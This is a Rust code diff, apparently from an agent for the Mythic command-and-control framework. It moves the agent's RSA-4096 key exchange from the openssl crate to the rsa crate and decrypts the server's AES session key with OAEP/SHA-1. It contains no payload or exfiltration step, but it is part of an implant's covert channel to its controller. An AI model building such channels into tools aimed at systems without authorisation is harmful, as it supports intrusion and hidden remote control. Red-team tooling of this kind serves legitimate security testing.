@@ -7,7 +7,8 @@ use aes::Aes256;
 use block_modes::{block_padding::Pkcs7, BlockMode, Cbc};
 use hmac::{Hmac, Mac, NewMac};
 use http::{profilevars, HTTPProfile};
-use openssl::rsa;
+use rsa::{RsaPrivateKey, RsaPublicKey, Oaep};
+use rsa::pkcs1::EncodeRsaPublicKey;
 use serde::Deserialize;
 use serde_json::json;
 use sha2::Sha256;
@@ -152,9 +153,10 @@ impl Profile {
 
     /// Performs an EKE with Mythic using the specified C2 profile
     pub fn perform_key_exchange(&mut self) -> Result<(), Box<dyn Error>> {
-        // Generate a private/public RSA 4096 key pair
-        let rsa_key = rsa::Rsa::generate(4096)?;
-        let public_key = rsa_key.public_key_to_pem_pkcs1()?;
+        let mut rng = rand::thread_rng();
+        let private_key = RsaPrivateKey::new(&mut rng, 4096)?;
+        let public_key = RsaPublicKey::from(&private_key);
+        let public_key_pem = public_key.to_pkcs1_pem(rsa::pkcs1::LineEnding::LF)?;
 
         // Generate a random session id
         let mut session_id: [char; 20] = ['a'; 20];
@@ -163,7 +165,7 @@ impl Profile {
         // Formulate the body for staging a key exchange
         let body = json!({
             "action": "staging_rsa",
-            "pub_key": general_purpose::STANDARD.encode(public_key),
+            "pub_key": general_purpose::STANDARD.encode(public_key_pem.as_bytes()),
             "session_id": session_id.iter().cloned().collect::<String>(),
         })
         .to_string();
@@ -182,11 +184,10 @@ impl Profile {
         // Parse the result
         let body: KeyExchangeReponse = serde_json::from_str(&body)?;
 
-        // Grab the new AES key from the RSA encrypted response
-        let mut new_key = vec![0; rsa_key.size() as usize];
+        // Decrypt the AES key (Mythic uses OAEP with SHA-1)
         let encrypted_aes_key = general_purpose::STANDARD.decode(&body.session_key)?;
-
-        rsa_key.private_decrypt(&encrypted_aes_key, &mut new_key, rsa::Padding::PKCS1_OAEP)?;
+        let padding = Oaep::new::<sha1::Sha1>();
+        let mut new_key = private_key.decrypt(padding, &encrypted_aes_key)?;
         new_key.truncate(32);
 
         // Set the new active profile
